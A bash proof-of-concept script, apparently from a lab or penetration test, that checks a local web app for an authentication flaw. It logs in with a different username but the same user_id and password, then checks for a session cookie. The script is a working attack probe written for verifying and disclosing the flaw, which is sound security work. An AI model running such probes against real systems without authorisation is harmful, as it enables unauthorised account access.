#!/bin/bash
# POC: Authentication Bypass via user_id Parameter Manipulation
# Target: http://localhost:8082
# Vulnerability: Application validates user_id+password but ignores username mismatch

TARGET="http://localhost:8082"

echo "=== Authentication Bypass POC ==="
echo "Target: $TARGET"
echo ""

echo "[*] Step 1: Normal authentication with username=test, user_id=10032, password=test"
RESPONSE1=$(curl -s -i -X POST "$TARGET/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&user_id=10032&password=test")
echo "$RESPONSE1" | grep -E "HTTP|Location|Set-Cookie"
echo ""

echo "[*] Step 2: Authentication bypass - DIFFERENT username but same user_id and password"
echo "[*] Submitting: username=attacker, user_id=10032, password=test"
RESPONSE2=$(curl -s -i -X POST "$TARGET/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&user_id=10032&password=test")
echo "$RESPONSE2" | grep -E "HTTP|Location|Set-Cookie"
echo ""

if echo "$RESPONSE2" | grep -q "302" && echo "$RESPONSE2" | grep -q "session="; then
    echo "[!] VULNERABILITY CONFIRMED!"
    echo "[!] Successfully authenticated with arbitrary username 'attacker'"
    echo "[!] Session cookie was created for user_id 10032"
    echo "[!] This proves the application only validates user_id+password, not username"
    exit 0
else
    echo "[-] Vulnerability not confirmed"
    exit 1
fi
